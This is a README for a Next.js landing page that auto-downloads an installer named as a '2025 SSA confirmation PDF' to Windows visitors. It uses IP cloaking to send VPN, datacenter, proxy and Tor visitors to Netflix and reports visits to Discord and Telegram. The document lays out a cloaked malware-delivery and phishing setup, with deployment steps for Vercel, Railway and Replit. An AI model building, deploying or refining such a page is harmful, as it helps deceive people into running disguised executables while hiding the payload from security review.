# Download Landing Page

A Next.js 16 web application that serves as a download landing page with automatic platform detection, IP-based cloaking, and analytics tracking.

## Features

- Automatic platform detection (Windows/non-Windows)
- Auto-triggers download for Windows users
- IP-based cloaking (VPN/datacenter/proxy/Tor detection)
- Unsafe visitors are redirected to Netflix
- Analytics tracking via Discord webhooks and Telegram
- Protected download endpoint with server-side IP verification

## Getting Started

### Development

```bash
npm install
npm run dev
```

Open [http://localhost:5000](http://localhost:5000) with your browser.

### Production Build

```bash
npm run build
npm start
```

## Environment Variables

Copy `.env.example` to `.env.local` and configure:

```env
# Notification Services (Optional)
DISCORD_WEBHOOK_URL=your-discord-webhook-url
TELEGRAM_BOT_TOKEN=your-telegram-bot-token
TELEGRAM_CHAT_ID=your-telegram-chat-id

# IP Detection (Optional - get from ipapi.is)
IPAPI_API_KEY=your-ipapi-key
```

## Deployment

### Deploy to Vercel

1. Push your code to GitHub
2. Import your repository on [Vercel](https://vercel.com/new)
3. Add your environment variables in the Vercel dashboard
4. Deploy

[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new)

### Deploy to Railway

1. Push your code to GitHub
2. Create a new project on [Railway](https://railway.app)
3. Connect your GitHub repository
4. Add environment variables in Railway dashboard
5. Railway will automatically use `railway.json` configuration

**Railway Configuration (auto-configured via railway.json):**
- Build Command: `npm run build:standalone`
- Start Command: `node .next/standalone/server.js`
- Node Version: 20+ (specified in `.nvmrc` and `package.json` engines)

**Required Environment Variables:**
- `PORT` (Railway sets this automatically)
- `DISCORD_WEBHOOK_URL` (optional)
- `TELEGRAM_BOT_TOKEN` (optional)
- `TELEGRAM_CHAT_ID` (optional)
- `IPAPI_API_KEY` (optional)
- `DOWNLOAD_FILE_PATH` (optional, default: `protected/2025-ssa-confirmationpdf.msi`)

[![Deploy on Railway](https://railway.app/button.svg)](https://railway.app/new)

### Deploy to Replit

The project is already configured for Replit:
- Development server runs on port 5000
- Use the "Publish" button in Replit to deploy

## Project Structure

```
src/
├── app/
│   ├── api/
│   │   ├── check-ip/route.ts   # IP safety check
│   │   ├── download/route.ts   # Protected download
│   │   └── track/route.ts      # Analytics tracking
│   ├── page.tsx                # Main landing page
│   └── layout.tsx              # Root layout
├── components/
│   ├── DownloadGuide.tsx       # Download notification
│   └── PlatformModal.tsx       # Platform warning modal
└── lib/
    └── ipCheck.ts              # IP cloaking detection
protected/
└── ssa-confirmation.msi        # Protected download file
```

## Tech Stack

- **Framework:** Next.js 16 (App Router)
- **Language:** TypeScript
- **Styling:** Tailwind CSS 4
- **Runtime:** Node.js 20+ (required for Next.js 16)

## License

Private
